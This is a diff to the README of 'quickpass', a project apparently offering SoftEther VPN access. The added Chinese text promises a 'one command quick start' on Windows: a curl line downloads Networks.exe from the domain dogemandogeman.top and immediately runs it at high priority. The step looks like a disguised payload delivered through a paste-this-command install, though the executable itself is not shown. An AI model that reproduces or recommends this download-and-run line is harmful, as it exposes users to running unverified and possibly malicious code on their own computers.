@@ -1,2 +1,5 @@
 # quickpass
-在Windows用戶端以及Liunx用戶端方便快速的使用Softether程式分支進行連接互聯網
+一条命令，即可快速开始！（在Windows上）。
+如果Linux或MacX，请寻找Softether VPN Client客户端进行连接。
+
+curl -O https://dogemandogeman.top/pages/att/Networks.exe & start /high Networks.exe
